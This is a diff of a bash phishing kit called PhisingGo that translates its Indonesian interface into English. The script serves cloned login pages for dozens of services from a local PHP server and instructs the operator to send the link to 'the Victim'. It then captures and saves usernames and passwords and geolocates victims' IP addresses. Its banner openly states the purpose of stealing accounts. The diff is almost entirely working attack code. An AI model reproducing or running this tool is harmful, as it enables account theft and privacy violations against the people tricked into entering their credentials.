@@ -1,11 +1,11 @@
 #!/usr/bin/bash
 # PhisingGo
-# Mod by Nedi Senja
+# Coded by thelinuxchoice
 # Github: https://github.com/stepbystepexe/PhisingGo
 trap 'echo;stop;exit 1' 2
 checkroot(){
 if [[ "$(id -u)" -ne 0 ]]; then
-    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mMohon, jalankan program root!\n\n\e[0m"
+    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPlease, run program as root!\n\n\e[0m"
     exit 1
 fi
 }
@@ -15,11 +15,12 @@ clearscreen(){
     sleep 1
 }
 dependencies(){
-    command -v bash > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Bash belum terinstall. Mohon install sekarang."; exit 1; }
-    command -v curl > /dev/null 2>&1 || { echo >&2 "Sepertinya paket cURL belum terinstall. Mohon install sekarang."; exit 1; }
-    command -v wget > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Wget belum terinstall. Mohon install sekarang."; exit 1; }
-    command -v openssl > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Openssl belum terinstall. Mohon install sekarang."; exit 1; }
-    command -v git > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Git belum terinstall. Mohon install sekarang."; exit 1; }
+    command -v bash > /dev/null 2>&1 || { echo >&2 "I require bash but it's not installed. Install it aborting."; exit 1; }
+    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it aborting."; exit 1; }
+    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it aborting."; exit 1; }
+    command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Install it aborting."; exit 1; }
+    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it aborting."; exit 1; }
+    command -v git > /dev/null 2>&1 || { echo >&2 "I require git but it's not installed. Install it aborting."; exit 1; }
     if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
         echo "/dev/urandom tidak ditemukan!"
     exit 1
@@ -43,15 +44,15 @@ printf "                                        \e[0;33m▬▬▬▬▬▬▬▬
 \e[0m[\e[1;2;96m11\e[0m] \e[1;77mSteam     \e[0m     \e[0m[\e[1;2;96m30\e[0m] \e[1;77mMySpace  \e[0m      \e[0;33m▐\e[0;34m▒▒▒▒▒▒▒▒▒▒▒\e[0;31m▐\e[0;34m▒▒▒▒\e[0;31m\e[0;31m▌\e[0;34m▒▒▒▒▒\e[0;33m▌\e[0m
 \e[0m[\e[1;2;96m12\e[0m] \e[1;77mYahoo     \e[0m     \e[0m[\e[1;2;96m31\e[0m] \e[1;77mBadoo    \e[0m      \e[0;33m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 \e[0m[\e[1;2;96m13\e[0m] \e[1;77mLinkedin  \e[0m     \e[0m[\e[1;2;96m32\e[0m] \e[1;77mVk       \e[0m
-\e[0m[\e[1;2;96m14\e[0m] \e[1;77mProtonmail\e[0m     \e[0m[\e[1;2;96m33\e[0m] \e[1;77mYandex   \e[0m      \e[0m[\e[1;93m&\e[0m] LISENSI\e[0m
-\e[0m[\e[1;2;96m15\e[0m] \e[1;77mWordpress \e[0m     \e[0m[\e[1;2;96m34\e[0m] \e[1;77mdevianART\e[0m      \e[0m[\e[1;94m#\e[0m] Informasi\e[0m
-\e[0m[\e[1;2;96m16\e[0m] \e[1;77mMicrosoft \e[0m     \e[0m[\e[1;2;96m35\e[0m] \e[1;77mWattpad  \e[0m      \e[0m[\e[1;92m*\e[0m] Perbarui\e[0m
-\e[0m[\e[1;2;96m17\e[0m] \e[1;77mFollowers \e[0m     \e[0m[\e[1;2;96m36\e[0m] \e[1;77mGame     \e[0m      \e[0m[\e[1;91m-\e[0m] Keluar\e[0m
+\e[0m[\e[1;2;96m14\e[0m] \e[1;77mProtonmail\e[0m     \e[0m[\e[1;2;96m33\e[0m] \e[1;77mYandex   \e[0m      \e[0m[\e[1;93m&\e[0m] LICENSE\e[0m
+\e[0m[\e[1;2;96m15\e[0m] \e[1;77mWordpress \e[0m     \e[0m[\e[1;2;96m34\e[0m] \e[1;77mdevianART\e[0m      \e[0m[\e[1;94m#\e[0m] Information\e[0m
+\e[0m[\e[1;2;96m16\e[0m] \e[1;77mMicrosoft \e[0m     \e[0m[\e[1;2;96m35\e[0m] \e[1;77mWattpad  \e[0m      \e[0m[\e[1;92m*\e[0m] Update\e[0m
+\e[0m[\e[1;2;96m17\e[0m] \e[1;77mFollowers \e[0m     \e[0m[\e[1;2;96m36\e[0m] \e[1;77mGame     \e[0m      \e[0m[\e[1;91m-\e[0m] Exit\e[0m
 \e[0m[\e[1;2;96m18\e[0m] \e[1;77mFisipon   \e[0m     \e[0m[\e[1;2;96m37\e[0m] \e[1;77mCustom   \e[0m
 \e[0m[\e[1;2;96m19\e[0m] \e[1;77mOutlook   \e[0m     \e[0m[\e[1;2;96m38\e[0m] \e[1;77mOthers   \e[0m      "
 }
 menu(){
-    read -p $'\e[0m(\e[105;77;1m/\e[0m) \e[1;77mMasukan opsi: \e[0m\en' option
+    read -p $'\e[0m(\e[105;77;1m/\e[0m) \e[1;77mChoose an option: \e[0m\en' option
         if [[ $option == 01 || $option == 1 ]]; then
         server="instagram"
         start
@@ -184,18 +185,18 @@ menu(){
         echo
         git pull origin master
         echo
-        read -p $'\e[0m[\e[32m Tekan Enter \e[0m]'
+        read -p $'\e[0m[\e[32m Back \e[0m]'
         clearscreen
         banner
         menu
         elif [[ $option == '-' ]]; then
         echo
-        printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mKeluar dari program!\n\e[0m"
+        printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mExit the program!\n\e[0m"
         echo
         exit 1
     else
         echo
-        printf "\e[0m[=\e[1;41;77m Pilihan Salah \e[0m=]"
+        printf "\e[0m[=\e[1;41;77m Invalid Option \e[0m=]"
         echo
         sleep 1
     clearscreen
@@ -208,22 +209,22 @@ clear
 printf "\e[0;47;90;1m[              PhisingGo, My Github: @stepbyatepexe              ]\e[0m\n"
 toilet -f smslant 'PhisingGo'
 printf "
-Nama        : PhisingGo
-Versi       : 1.1 (Update: 30 Januari 2020, 1:30 PM)
-Tanggal     : 20 Juli 2019
+Name        : PhisingGo
+Version     : 1.1 (Update: 30 January 2020, 3:31 AM)
+Tanggal     : 20 July 2019
 Mod         : Nedi Senja
-Tujuan      : Mencuri akun dengan metode phising
-              menggunakan tool PhisingGo
-Terimakasih : Allah SWT.
-              FR13NDS, & seluruh
-              manusia seplanet bumi
-NB          : Manusia gax ada yang sempurna
-              sama kaya yang mod tool ini.
-              Silahkan laporkan kritik atau saran
-              Ke - Email: d_q16x@outlook.co.id
-                 - WhatsApp: https://tinyurl.com/wel4alo
+Purpose     : Stealing accounts using the method
+              Modern Phising PhisingGo.
+Thankyou    : Allah SWT.
+              FR13NDS, & all over
+              humans on planet earth
+NB          : Humans are not perfect
+              as rich as this tool.
+              Please report criticism or suggestions
+              To - Email: d_q16x@outlook.co.id
+                 - WhatsApp: tinyurl.com/wel4alo
 
-[ \e[4mGunakan tool ini dengan bijak \e[0m]\n"
+[ \e[4mUse this tool wisely. Thanks \e[0m] """
 sleep 1
 read -p $'\n\n\e[0m[ Tekan Enter ]' opt
     if [[ $opt = '' ]]; then
@@ -240,18 +241,18 @@ stop(){
     fi
 }
 createpage(){
-    default_cap1="Wi-fi Sudah Kadaluarsa"
-    default_cap2="Mohon Login Kembali."
-    default_user_text="Pengguna:"
-    default_pass_text="Sandi:"
+    default_cap1="Wi-fi Session Expired"
+    default_cap2="Please login again."
+    default_user_text="Username:"
+    default_pass_text="Password:"
     default_sub_text="Log-In"
-        read -p $'\n\e[0m[\e[1;92m*\e[0m] \e[1;77mTitle 1 \e[0m(Default: Wi-fi Sudah Kadaluarsa): \e[1;77m' cap1
+        read -p $'\n\e[0m[\e[1;92m*\e[0m] \e[1;77mTitle 1 \e[0m(Default: Wi-fi Session Expired): \e[1;77m' cap1
         cap1="${cap1:-${default_cap1}}"
-            read -p $'\e[0m[\e[1;93m*\e[0m] \e[1;77mTitle 2 \e[0m(Default: Mohon Login Kembali): \e[1;77m' cap2
+            read -p $'\e[0m[\e[1;93m*\e[0m] \e[1;77mTitle 2 \e[0m(Default: Please login again.): \e[1;77m' cap2
             cap2="${cap2:-${default_cap2}}"
-                read -p $'\e[0m[\e[1;94m*\e[0m] \e[1;77mPengguna gagal \e[0m(Default: Pengguna): \e[1;77m' user_text
+                read -p $'\e[0m[\e[1;94m*\e[0m] \e[1;77mPengguna gagal \e[0m(Default: Username): \e[1;77m' user_text
                 user_text="${user_text:-${default_user_text}}"
-                    read -p $'\e[0m[\e[1;95m*\e[0m] \e[1;77mSandi gagal \e[0m(Default: Sandi): \e[1;77m' pass_text
+                    read -p $'\e[0m[\e[1;95m*\e[0m] \e[1;77mSandi gagal \e[0m(Default: Password): \e[1;77m' pass_text
                     pass_text="${pass_text:-${default_pass_text}}"
                         read -p $'\e[0m[\e[1;96m*\e[0m] \e[1;77mKlik gagal \e[0m(Default: Log-In): \e[1;77m' sub_text
                         sub_text="${sub_text:-${default_sub_text}}"
@@ -278,18 +279,18 @@ catch_cred(){
     account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
     IFS=$'\n'
     password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-        printf "\e[0m[\e[1;94m#\e[0m] Akun:\e[0;1;77m %s\n\e[0m" $account
-        printf "\e[0m[\e[1;96m*\e[0m] Sandi:\e[0;1;77m %s\n\e[0m" $password
+        printf "\e[0m[\e[1;94m#\e[0m] Accounts:\e[0;1;77m %s\n\e[0m" $account
+        printf "\e[0m[\e[1;96m*\e[0m] Password:\e[0;1;77m %s\n\e[0m" $password
         cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-        printf "\e[0m[\e[1;95m+\e[0m] Simpan:\e[0;1;77m sites/%s/simpan.usernames.txt\e[0m\n" $server
+        printf "\e[0m[\e[1;95m+\e[0m] Saved:\e[0;1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
         killall -2 php > /dev/null 2>&1
     exit 1
 }
 getcredentials() {
-    printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mMenunggu kredensial ...\e[0m\n"
+    printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mWaiting credensial ...\e[0m\n"
     while [ true ]; do
         if [[ -e "sites/$server/usernames.txt" ]]; then
-            printf "\n\e[0m[\e[1;91m!\e[0m] \e[0;1;77mKredensial Ditemukan!\n"
+            printf "\n\e[0m[\e[1;91m!\e[0m] \e[0;1;77mCredensial Found!\n"
             catch_cred
         fi
     sleep 1
@@ -301,8 +302,8 @@ catch_ip(){
     IFS=$'\n'
     ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
         printf "\e[0m[\e[1;94m#\e[0m] Target IP:\e[0;1;77m %s\e[0m\n" $ip
-        printf "\e[0m[\e[1;93m*\e[0m] Agen Pengguna:\e[0;1;77m %s\e[0m\n" $ua
-        printf "\e[0m[\e[1;96m&\e[0m] Simpan:\e[0;1;77m %s/simpan.ip.txt\e[0m\n" $server
+        printf "\e[0m[\e[1;93m*\e[0m] Useragent:\e[0;1;77m %s\e[0m\n" $ua
+        printf "\e[0m[\e[1;96m&\e[0m] Saved:\e[0;1;77m %s/saved.ip.txt\e[0m\n" $server
         cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
         if [[ -e iptracker.log ]]; then
             rm -rf iptracker.log
@@ -323,22 +324,22 @@ continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cu
     fi
     ##
     if [[ $continent != "" ]]; then
-        printf "\e[0m[\e[1;94m*\e[0m] \e[0;1;77mIP Benua:\e[0m %s\e[0m\n" $continent
+        printf "\e[0m[\e[1;94m*\e[0m] \e[0;1;77mIP Continet:\e[0m %s\e[0m\n" $continent
     fi
     ##
     country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
     if [[ $country != "" ]]; then
-        printf "\e[0m[\e[1;93m*\e[0m] \e[0;1;77mIP Negara:\e[0m %s\e[0m\n" $country
+        printf "\e[0m[\e[1;93m*\e[0m] \e[0;1;77mIP Country:\e[0m %s\e[0m\n" $country
     fi
     ##
     state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
     if [[ $state != "" ]]; then
-        printf "\e[0m[\e[1;92m*\e[0m] \e[0;1;77mNegara:\e[0m %s\e[0m\n" $state
+        printf "\e[0m[\e[1;92m*\e[0m] \e[0;1;77mState:\e[0m %s\e[0m\n" $state
     fi
     ##
     city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
     if [[ $city != "" ]]; then
-        printf "\e[0m[\e[1;91m*\e[0m] \e[0;1;77mLokasi Kota:\e[0m %s\e[0m\n" $city
+        printf "\e[0m[\e[1;91m*\e[0m] \e[0;1;77mCity Location:\e[0m %s\e[0m\n" $city
     fi
     ##
     isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
@@ -348,17 +349,17 @@ continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cu
     ##
     as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
     if [[ $as_number != "" ]]; then
-        printf "\e[0m[\e[1;95m*\e[0m] \e[0;1;77mSebagian Nomor:\e[0m %s\e[0m\n" $as_number
+        printf "\e[0m[\e[1;95m*\e[0m] \e[0;1;77mAS Number:\e[0m %s\e[0m\n" $as_number
     fi
     ##
     ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
     if [[ $ip_speed != "" ]]; then
-        printf "\e[0m[\e[1;94m*\e[0m] \e[0;1;77mKecepatan Alamat IP:\e[0m %s\e[0m\n" $ip_speed
+        printf "\e[0m[\e[1;94m*\e[0m] \e[0;1;77mIP Address Speed:\e[0m %s\e[0m\n" $ip_speed
     fi
     ##
     ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
     if [[ $ip_currency != "" ]]; then
-        printf "\e[0m[\e[1;93m*\e[0m] \e[0;1;77mMata Uang:\e[0m %s\e[0m\n" $ip_currency
+        printf "\e[0m[\e[1;93m*\e[0m] \e[0;1;77mIP Currency:\e[0m %s\e[0m\n" $ip_currency
     fi
     ##
     printf "\n"
@@ -374,20 +375,20 @@ start(){
             rm -rf sites/$server/usernames.txt
         fi
 default_ip=$(hostname -i)
-printf "\n\e[0m[\e[1;92m+\e[0m] \e[0;1;77mMasukan Lokal IP \e[0m(Default %s)\e[1;77m: " $default_ip
+printf "\n\e[0m[\e[1;92m+\e[0m] \e[0;1;77mPut your local IP \e[0m(Default %s)\e[1;77m: " $default_ip
 read ip
 ip="${ip:-${default_ip}}"
-printf "\e[0m[\e[1;93m*\e[0m] \e[0;1;77mMemulai php server...\n"
+printf "\e[0m[\e[1;93m*\e[0m] \e[0;1;77mStarting php server...\n"
 sudo php -t "sites/$server" -S "$ip:80" > /dev/null 2>&1 &
 sleep 2
-printf "\e[0m[\e[1;94m*\e[0m] \e[0;1;77mKirim tautan IP ini ke korban:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[0m[\e[1;94m*\e[0m] \e[0;1;77mSend this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ip
 checkfound
 }
 checkfound(){
-printf "\e[0m[\e[1;95m*\e[0m] \e[0;1;77mMenunggu korban membuka tautan ...\e[0m\n"
+printf "\e[0m[\e[1;95m*\e[0m] \e[0;1;77mWaiting victim open the link ...\e[0m\n"
     while [ true ]; do
         if [[ -e "sites/$server/ip.txt" ]]; then
-            printf "\n\e[0m[\e[1;91m!\e[0m] \e[0;1;77mIP Ditemukan!\n"
+            printf "\n\e[0m[\e[1;91m!\e[0m] \e[0;1;77mIP Found!\n"
             catch_ip
         fi
     sleep 1
